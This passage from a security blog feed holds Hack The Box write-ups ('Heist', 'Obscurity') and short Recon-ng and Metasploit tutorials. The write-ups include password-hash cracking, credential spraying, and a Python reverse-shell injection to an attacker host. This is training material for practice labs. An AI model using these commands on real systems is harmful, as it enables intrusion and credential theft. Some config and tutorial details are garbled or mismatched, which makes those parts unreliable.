let's go through the config file.</p><!--kg-card-begin: markdown--><pre><code>version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
</code></pre>
<!--kg-card-end: markdown--><p>6. This config file contains:</p><ul><li>2 user passwords encrypted with a <a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html">Cisco Type 7 algorithm</a> which can be <a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">easily cracked</a>;</li><li>the <em>enable secret</em> password, which is an MD5 hash.</li></ul><p>7. To crack the MD5 hash we use <a href="https://hashcat.net/hashcat/">hashcat</a> combined with the RockYou list, which we'll filter by words &gt;= 12 chars, since the config file lets us know that this router's passwords are at least 12 chars long.</p><!--kg-card-begin: markdown--><pre><code>$ hashcat -a 0 -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' rockyou_12andabove.txt
</code></pre>
<!--kg-card-end: markdown--><p>where:</p><ul><li>-a 0 = "straight" attack-mode</li><li>-m 500 = Cisco-IOS $1$ (MD5) hash type</li></ul><p>8. Now that we know Hazard's router's password, we're going to use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to try and login as Hazard on the machine</p><!--kg-card-begin: markdown--><pre><code>$  crackmapexec heist.htb -u Hazard -p xxx
...
CME heist.htb:445 SUPPORTDESK [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME heist.htb:445 SUPPORTDESK [+] SUPPORTDESK\Hazard:xxx
</code></pre>
<!--kg-card-end: markdown--><p>9. So, we know now that the machine is a Windows 10, that it's a part of the SUPPORTDESK domain, and that the credentials we found are valid.<br>To enumerate the domain's users, we're going to use <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>.</p><!--kg-card-begin: markdown--><pre><code>$ python impacket/build/scripts-2.7/lookupsid.py SUPPORTDESK/Hazard:xxx@heist.htb

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at heist.htb
[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
</code></pre>
<!--kg-card-end: markdown--><p>10. So, let's create a file with all the users we know about and a file with the 3 passwords we cracked and let's see what works:</p><!--kg-card-begin: markdown--><pre><code>$ crackmapexec heist.htb -d SUPPORTDESK -u users.txt -p passwords.txt
</code></pre>
<!--kg-card-end: markdown--><p>P.S. According to crackmapexec's manual the -u option should allow a file to be passed as an argument, but this didn't work so I had to test each user individually.</p><p>11. We find that one of the credentials are valid for Chase, so let's try to establish a remote connection for that user with <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ruby evil-winrm/evil-winrm.rb -i heist.htb -u Chase -p 'xxx'
Evil-WinRM shell v1.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
</code></pre>
<!--kg-card-end: markdown--><p>12. The user's flag is on the Dektop!</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Obscurity]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080.</p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV -oA obscurity.htb

22/tcp open ssh OpenSSH</code></pre>]]></description><link>https://inesmartins.github.io/htb-walkthrough-obscurity/</link><guid isPermaLink="false">5edd283564e6e34f1b3f7f1d</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 17:54:05 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/1-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/1-1.png" alt="HTB Write-up | Obscurity"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080.</p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV -oA obscurity.htb

22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8080/tcp open http-proxy BadHTTPServer
```</code></pre>
<!--kg-card-end: markdown--><p>2. There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io/content/images/2020/06/obscurity_img0_1.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io/content/images/2020/06/obscurity_img0_2.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io/content/images/2020/06/obscurity_img0_3.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
</code></pre>
<!--kg-card-end: markdown--><p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br>While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/obscurity_img1.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>5. Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as wwwdata.</p><!--kg-card-begin: markdown--><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
</code></pre>
<!--kg-card-end: markdown--><p>6. Our first goal is to become robert.</p><!--kg-card-begin: markdown--><pre><code>$ cat etc/passwd
...
robert:x:1000:1000:robert:/home/robert:/bin/bash
</code></pre>
<!--kg-card-end: markdown--><p>7. Listing the contents of robert's home directy, we get some interesting files:</p><!--kg-card-begin: markdown--><pre><code>$ ls /home/robert
BetterSSH/BetterSSH.py
check.txt
out.txt
passwordreminder.txt
SuperSecureCrypt.py
user.txt
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>$ cat out.txt
¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v$$ cat passwordreminder.txt´ÑÈÌÉàÙÁÑé¯·¿
</code></pre>
<!--kg-card-end: markdown--><p>8. So, by encrypting check.txt with an unknown key we get out.txt.<br>Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br>Let's create a script to find the key!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/script1.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>9. Now that we have the key ('alexandrovich'), let's use it to find robert's password!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/script2.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>10. Now that we have robert's password we can SSH into the machine, get the user flag and move on to root. We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ./LinEnum.sh...
User robert may run the following commands on obscure:
(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-e
</code></pre>
<!--kg-card-end: markdown--><p>11. Let's run BetterSSH as sudo to test this:</p><!--kg-card-begin: markdown--><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: xxx
Authed!
</code></pre>
<!--kg-card-end: markdown--><p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on /tmp/SSH/.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/script3.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/script4.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>14. Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><!--kg-card-begin: markdown--><pre><code>$ echo &quot;root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7&quot; &gt; shadow
$ echo &quot;root:x:0:0:root:/root:/bin/bash&quot; &gt; passwd
$ unshadow passwd shadow &gt; crack.password.db
$ john crack.password.db
</code></pre>
<!--kg-card-end: markdown--><p>15. That's it, hope you enjoyed it!</p>]]></content:encoded></item><item><title><![CDATA[Recon-ng 5 | The Basics]]></title><description><![CDATA[<p>1. Get the latest version of the <a href="https://tools.kali.org/information-gathering/recon-ng">Recon-ng</a>.</p><!--kg-card-begin: markdown--><pre><code>sudo apt-get update
sudo apt-get install recon-ng
</code></pre>
<!--kg-card-end: markdown--><p>2. Start the application.</p><!--kg-card-begin: markdown--><pre><code>recon-ng
</code></pre>
<!--kg-card-end: markdown--><p>3. List workspaces.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; workspaces list
+------------+
| Workspaces |
+------------+
| default |
+------------+
</code></pre>
<!--kg-card-end: markdown--><p>4. Create a new workspace.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; workspaces create testymcgee
[recon-ng][testymcgee] &gt;
</code></pre>
<!--kg-card-end: markdown--><p>5. Select a</p>]]></description><link>https://inesmartins.github.io/recon-ng-5/</link><guid isPermaLink="false">5edd226864e6e34f1b3f7e82</guid><category><![CDATA[recon-ng]]></category><category><![CDATA[kali]]></category><category><![CDATA[tutorial]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 17:32:03 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/recon-ng.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/recon-ng.png" alt="Recon-ng 5 | The Basics"><p>1. Get the latest version of the <a href="https://tools.kali.org/information-gathering/recon-ng">Recon-ng</a>.</p><!--kg-card-begin: markdown--><pre><code>sudo apt-get update
sudo apt-get install recon-ng
</code></pre>
<!--kg-card-end: markdown--><p>2. Start the application.</p><!--kg-card-begin: markdown--><pre><code>recon-ng
</code></pre>
<!--kg-card-end: markdown--><p>3. List workspaces.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; workspaces list
+------------+
| Workspaces |
+------------+
| default |
+------------+
</code></pre>
<!--kg-card-end: markdown--><p>4. Create a new workspace.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; workspaces create testymcgee
[recon-ng][testymcgee] &gt;
</code></pre>
<!--kg-card-end: markdown--><p>5. Select a workspace.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][testymcgee] &gt; workspaces select default
[recon-ng][default] &gt;
</code></pre>
<!--kg-card-end: markdown--><p>6. Delete a workspace.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; workspaces delete testymcgee
</code></pre>
<!--kg-card-end: markdown--><p>7. Refresh the marketplace index.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; marketplace refresh
[*] Marketplace index refreshed.
</code></pre>
<!--kg-card-end: markdown--><p>8. List all modules available on marketplace.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; marketplace search
</code></pre>
<!--kg-card-end: markdown--><p>9. Find a specific module.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; marketplace search [module]
</code></pre>
<!--kg-card-end: markdown--><p>10. Install a module.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; marketplace install [module_path]
</code></pre>
<!--kg-card-end: markdown--><p>11. Start using a module.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; modules load [module_path]
</code></pre>
<!--kg-card-end: markdown--><p>12. List the selected module's options.List the module's name, author, version, description and options.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default][hackertarget] &gt; info
</code></pre>
<!--kg-card-end: markdown--><p>13. Configure the module's options.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default][hackertarget] &gt; options set SOURCE [host]
SOURCE =&gt; [host]
</code></pre>
<!--kg-card-end: markdown--><p>14. Run the module.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default][hackertarget] &gt; run
</code></pre>
<!--kg-card-end: markdown--><p>15. Return to the "main menu".</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default][hackertarget] &gt; back
[recon-ng][default] &gt;
</code></pre>
<!--kg-card-end: markdown--><p>16. Exit the app.</p><!--kg-card-begin: markdown--><pre><code>[recon-ng][default] &gt; exit
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Metasploit 5 | The Basics]]></title><description><![CDATA[<p><em>Tested on Kali GNU/Linux 2020.1</em></p><p>1. Get the latest version of the <a href="https://www.metasploit.com/">Metasploit Framework</a>.</p><!--kg-card-begin: markdown--><pre><code>sudo apt-get update
sudo apt-get install metasploit-framework
</code></pre>
<!--kg-card-end: markdown--><p>2. Create the database.</p><!--kg-card-begin: markdown--><pre><code>sudo msfdb init
</code></pre>
<!--kg-card-end: markdown--><p>3. Start Metasploit's console-based interface.</p><!--kg-card-begin: markdown--><pre><code>msfconsole
</code></pre>
<!--kg-card-end: markdown--><p>4. Check that Metasploit is connected to the DB.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; db_status
[*] Connected</code></pre>]]></description><link>https://inesmartins.github.io/untitled/</link><guid isPermaLink="false">5edd1dc464e6e34f1b3f7e32</guid><category><![CDATA[metasploit]]></category><category><![CDATA[metasploit framework]]></category><category><![CDATA[linux]]></category><category><![CDATA[tutorial]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 17:10:38 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/1.png" alt="Metasploit 5 | The Basics"><p><em>Tested on Kali GNU/Linux 2020.1</em></p><p>1. Get the latest version of the <a href="https://www.metasploit.com/">Metasploit Framework</a>.</p><!--kg-card-begin: markdown--><pre><code>sudo apt-get update
sudo apt-get install metasploit-framework
</code></pre>
<!--kg-card-end: markdown--><p>2. Create the database.</p><!--kg-card-begin: markdown--><pre><code>sudo msfdb init
</code></pre>
<!--kg-card-end: markdown--><p>3. Start Metasploit's console-based interface.</p><!--kg-card-begin: markdown--><pre><code>msfconsole
</code></pre>
<!--kg-card-end: markdown--><p>4. Check that Metasploit is connected to the DB.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; db_status
[*] Connected to msf. Connection type: postgresql.
</code></pre>
<!--kg-card-end: markdown--><p>5. List Metasploit's most relevant commands.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; help
</code></pre>
<!--kg-card-end: markdown--><p>6. List the available workspaces.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace
* default
</code></pre>
<!--kg-card-end: markdown--><p>7. Add a new workspace.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace -a testymcgee
[*] Added workspace: testymcgee
[*] Workspace: testymcgee
</code></pre>
<!--kg-card-end: markdown--><p>8. Select a workspace.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace default
[*] Workspace: default
</code></pre>
<!--kg-card-end: markdown--><p>9. Delete a workspace.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace -d testymcgee
[*] Deleted workspace: testymcgee
[*] Swiched to workspace: default
</code></pre>
<!--kg-card-end: markdown--><p>10. Search for a specific module. Alternatively, you can search directly on Metasploit's <a href="https://metasploit.help.rapid7.com/docs">web docs</a>.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; search [search term]
</code></pre>
<!--kg-card-end: markdown--><p>11. See more information about a module. This includes the module's name, path, description, date of disclosure, <a href="https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking">rank</a>, support for the <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check%28%29-method">check command</a>, author, basic options and references.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; info [module_path]
</code></pre>
<!--kg-card-end: markdown--><p>12. Setup the module.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; set RHOST [ip]
msf5 &gt; set RPORT [port]
...
</code></pre>
<!--kg-card-end: markdown--><p>13. Setup global options.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; set -g RHOST [ip]
msf5 &gt; set -g RPORT [port]
</code></pre>
<!--kg-card-end: markdown--><p>14. Select an exploit module.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use [exploit_path]
</code></pre>
<!--kg-card-end: markdown--><p>15. Show options for the selected exploit.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; show options
</code></pre>
<!--kg-card-end: markdown--><p>16. List the targets supported by the exploit.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; show options
</code></pre>
<!--kg-card-end: markdown--><p>17. List available payloads for these targets.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; show targets
</code></pre>
<!--kg-card-end: markdown--><p>18. Select a payload.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; set payload [payload_path]
payload =&gt; [payload_path]
</code></pre>
<!--kg-card-end: markdown--><p>19. Run the exploit. Note that if we don't select a payload, Metasploit uses the default.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; exploit
</code></pre>
<!--kg-card-end: markdown--><p>20. Return to "main menu".</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; back
msf5 &gt;
</code></pre>
<!--kg-card-end: markdown--><p>21. Exit the app.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; exit
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item></channel></rss>